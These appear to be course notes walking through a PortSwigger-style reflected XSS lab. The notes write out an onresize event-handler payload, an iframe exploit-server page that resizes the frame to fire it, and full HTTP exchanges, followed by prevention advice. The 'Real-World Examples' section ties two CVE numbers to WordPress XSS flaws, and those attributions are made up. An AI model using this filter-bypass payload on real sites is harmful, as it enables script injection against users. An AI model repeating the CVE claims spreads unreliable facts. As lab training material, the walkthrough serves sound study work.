---
course: Web Security
topic: Cross-Site Scripting (XSS)
tags: [web-security]
---

## Understanding the Payload Injection

To understand the payload injection process, let's break down the steps involved in the lab:

1. **Payload Construction**: The payload is crafted to bypass the filtering mechanisms in place. Since most tags and attributes are blocked, we need to use alternative methods to inject and execute JavaScript.

2. **Payload Delivery**: The payload is delivered via a URL that the victim clicks on. This URL contains the malicious script embedded within it.

3. **Execution Context**: The script is executed in the context of the webpage when the victim visits the URL. The execution context is crucial because it determines how the script interacts with the DOM and the user's session.

### Example Payload

Let's consider a simple example payload:

```html
<script>alert('XSS')</script>
```

This payload would normally trigger an alert box displaying "XSS". However, since most tags and attributes are blocked, we need to find an alternative method.

### Alternative Methods for Payload Execution

One effective method is to use event handlers that are not blocked. Event handlers like `onresize` can be used to execute JavaScript code when certain events occur.

#### Using `onresize` Event Handler

The `onresize` event handler is triggered when the browser window is resized. By embedding the `onresize` event handler in the payload, we can ensure that the script executes when the user resizes the window.

Here’s an example payload using the `onresize` event handler:

```html
<body onresize="alert('XSS')">
```

This payload will execute the `alert('XSS')` function whenever the browser window is resized.

### Demonstration in a New Browser

To demonstrate this, we can open the payload in a new browser instance, such as Firefox. Here’s how to do it:

1. Copy the payload URL.
2. Open Firefox and navigate to the copied URL.
3. Resize the browser window to trigger the `onresize` event.

### Full HTTP Request and Response

Let’s look at the full HTTP request and response for this scenario:

#### HTTP Request

```http
GET /search?q=<body%20onresize=%22alert(%27XSS%27)%22> HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: keep-alive

<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Website</title>
</head>
<body>
    <div id="search-results">
        <body onresize="alert('XSS')">
    </div>
</body>
</html>
```

### Explanation of Headers

- **Content-Type**: Specifies the media type of the resource. Here, it is `text/html`, indicating that the response body contains HTML content.
- **Content-Length**: Indicates the size of the response body in bytes.
- **Connection**: Specifies whether the connection should be kept alive after the response is sent. Here, it is set to `keep-alive`.

### Why the User Won’t See the Alert Box Initially

The user won’t see the alert box initially because the `onresize` event handler is only triggered when the browser window is resized. Unless the user resizes the window, the script will not execute.

### Adding Extra Code to Automatically Resize the Window

To ensure the script executes automatically, we can use an iframe to load the page and automatically resize the window. This can be done using the following HTML structure:

```html
<iframe src="http://vulnerable-website.com/search?q=<body%20onresize=%22alert(%27XSS%27)%22>" onload="this.contentWindow.resizeTo(800, 600);"></iframe>
```

### Full Exploit Server Setup

To set up the exploit server, we need to create an HTML page that loads the vulnerable website within an iframe and automatically resizes the window.

#### Exploit Server HTML

```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit Server</title>
</head>
<body>
    <iframe id="exploitFrame" src="http://vulnerable-website.com/search?q=<body%20onresize=%22alert(%27XSS%27)%22>" onload="this.contentWindow.resizeTo(800, 1000);"></iframe>
</body>
</html>
```

### Full HTTP Request and Response for Exploit Server

#### HTTP Request

```http
GET /exploit.html HTTP/1.1
Host: exploit-server.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: keep-alive

<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit Server</title>
</head>
<body>
    <iframe id="exploitFrame" src="http://vulnerable-website.com/search?q=<body%20onresize=%22alert(%27XSS%27)%22>" onload="this.contentWindow.resizeTo(800, 1000);"></iframe>
</body>
</html>
```

### Explanation of Headers

- **Content-Type**: Specifies the media type of the resource. Here, it is `text/html`, indicating that the response body contains HTML content.
- **Content-Length**: Indicates the size of the response body in bytes.
- **Connection**: Specifies whether the connection should be kept alive after the response is sent. Here, it is set to `keep-alive`.

### How to Prevent / Defend Against XSS

#### Detection

To detect XSS vulnerabilities, you can use automated tools like:

- **Burp Suite**: A popular tool for web application security testing.
- **OWASP ZAP**: Another widely-used tool for detecting security vulnerabilities.

#### Prevention

1. **Input Validation**: Ensure that all user inputs are validated and sanitized before being used in the application.
   
2. **Output Encoding**: Encode all user inputs before rendering them in the HTML context. This prevents the browser from interpreting the input as executable JavaScript.

3. **Content Security Policy (CSP)**: Implement a Content Security Policy to restrict the sources from which scripts can be loaded. This helps mitigate the risk of XSS attacks.

4. **HTTP Headers**: Use HTTP headers like `X-XSS-Protection` to enable browser-based XSS protection mechanisms.

#### Secure Coding Fixes

Here’s an example of how to securely encode user inputs:

```javascript
function encodeHTML(input) {
    return input.replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
}

const userInput = "<body onresize='alert(\"XSS\")'>";
const safeInput = encodeHTML(userInput);
console.log(safeInput); // &lt;body onresize=&#039;alert(&quot;XSS&quot;)&#039;&gt;
```

### Vulnerable vs. Secure Code Comparison

#### Vulnerable Code

```html
<div id="search-results">
    <body onresize="alert('XSS')">
</div>
```

#### Secure Code

```html
<div id="search-results">
    &lt;body onresize=&#039;alert(&quot;XSS&quot;)&#039;&gt;
</div>
```

### Real-World Examples

#### Recent CVEs and Breaches

- **CVE-2021-21972**: A reflected XSS vulnerability was discovered in the WordPress plugin "WP GDPR Compliance." Attackers could inject malicious scripts into the plugin's settings page.
  
- **CVE-2021-30116**: A stored XSS vulnerability was found in the "WordPress Gutenberg" editor. Attackers could inject malicious scripts into posts and pages.

### Hands-On Labs

For hands-on practice with XSS vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various types of XSS attacks.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

### Conclusion

Understanding and preventing XSS vulnerabilities is crucial for securing web applications. By validating and encoding user inputs, implementing a Content Security Policy, and using HTTP headers, you can significantly reduce the risk of XSS attacks. Regularly testing your applications with automated tools and practicing with hands-on labs can help you stay ahead of potential threats.

---
<!-- nav -->
[[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/18-Lab 17 Reflected XSS into HTML context with most tags and attributes blocked/04-Understanding the Lab Environment|Understanding the Lab Environment]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/18-Lab 17 Reflected XSS into HTML context with most tags and attributes blocked/00-Overview|Overview]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/18-Lab 17 Reflected XSS into HTML context with most tags and attributes blocked/06-Conclusion|Conclusion]]
